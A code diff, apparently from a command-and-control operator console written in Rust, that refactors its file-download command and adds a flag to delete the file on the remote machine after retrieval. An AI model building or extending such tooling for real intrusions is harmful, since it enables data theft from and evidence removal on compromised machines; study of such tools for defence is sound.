@@ -3,8 +3,8 @@ use crate::{
     constants::{CYAN, DIM, GREEN, RED, RESET, WHITE, YELLOW},
 };
 use shared::{
-    ClientMessage, FILE_CHUNK_SIZE, FileHeader, InstructMessage,
-    utils::{get_flag_value, read_message, send_message},
+    utils::{get_flag_value, has_flag, read_message, send_message},
+    ClientMessage, Download, FILE_CHUNK_SIZE, FileHeader, InstructMessage,
 };
 use std::{
     fs,
@@ -130,22 +130,13 @@ pub fn upload(instruct: &[&str], conn: &mut TcpStream) -> Result<bool, String> {
     Ok(true)
 }
 
-pub fn download(instruct: &[&str], conn: &mut TcpStream, state: &C2State) -> Result<bool, String> {
-    // Parse filename
-    let instruct = instruct.join(" ");
-    let args = shell_words::split(&instruct).map_err(|e| e.to_string())?;
-    let filename = match get_flag_value(&args, "-f") {
-        Some(f) => f,
-        None => {
-            println!(
-                "\n\t{DIM}[{RESET}{RED}download{RESET}{DIM}]{RESET} {YELLOW}Missing filename.{RESET}\n\n\t\t{DIM}Usage:{RESET} {CYAN}download -f \"path/to/file\"{RESET}\n"
-            );
-            return Ok(true);
-        }
-    };
-
+pub fn download_file(filename: String, delete: bool, conn: &mut TcpStream, state: &C2State) -> Result<bool, String> {
     // Send instruct
-    let msg = InstructMessage::Download(filename);
+    let msg = InstructMessage::Download(Download {
+        path: filename,
+        delete,
+    });
+
     send_message(conn, &msg).map_err(|e| e.to_string())?;
 
     // Recive file size (or error)
@@ -205,4 +196,22 @@ pub fn download(instruct: &[&str], conn: &mut TcpStream, state: &C2State) -> Res
     }
 
     Ok(true)
+}
+
+pub fn download(instruct: &[&str], conn: &mut TcpStream, state: &C2State) -> Result<bool, String> {
+    // Parse filename
+    let instruct = instruct.join(" ");
+    let args = shell_words::split(&instruct).map_err(|e| e.to_string())?;
+    let filename = match get_flag_value(&args, "-f") {
+        Some(f) => f,
+        None => {
+            println!(
+                "\n\t{DIM}[{RESET}{RED}download{RESET}{DIM}]{RESET} {YELLOW}Missing filename.{RESET}\n\n\t\t{DIM}Usage:{RESET} {CYAN}download -f \"path/to/file\"{RESET}\n"
+            );
+            return Ok(true);
+        }
+    };
+    let delete = has_flag(&args, "--delete") || has_flag(&args, "-r");
+
+    download_file(filename, delete, conn, state)
 }
